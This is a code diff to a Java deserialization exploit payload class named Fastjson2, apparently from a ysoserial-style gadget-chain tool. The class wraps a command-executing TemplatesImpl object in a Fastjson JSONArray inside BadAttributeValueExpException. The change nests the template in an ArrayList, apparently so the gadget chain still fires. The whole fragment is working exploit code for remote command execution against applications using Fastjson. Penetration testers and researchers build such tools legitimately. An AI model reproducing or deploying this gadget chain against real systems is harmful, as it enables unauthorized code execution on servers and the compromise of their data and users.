@@ -5,6 +5,8 @@ import com.h2tg.ysogate.annotation.Dependencies;
 import com.h2tg.ysogate.payloads.CommandObjectPayload;
 import com.h2tg.ysogate.utils.Gadgets;
 import com.h2tg.ysogate.utils.Reflections;
+
+import java.util.ArrayList;
 import java.util.HashMap;
 import javax.management.BadAttributeValueExpException;
 
@@ -14,7 +16,9 @@ public class Fastjson2 implements CommandObjectPayload<Object>
     public Object getObject(final String command) throws Exception {
         final Object template = Gadgets.createTemplatesImpl(command);
         JSONArray jsonArray = new JSONArray();
-        jsonArray.add(template);
+        ArrayList arrayList = new ArrayList();
+        arrayList.add(template);
+        jsonArray.add(arrayList);
 
         BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
         Reflections.setFieldValue(badAttributeValueExpException, "val", jsonArray);
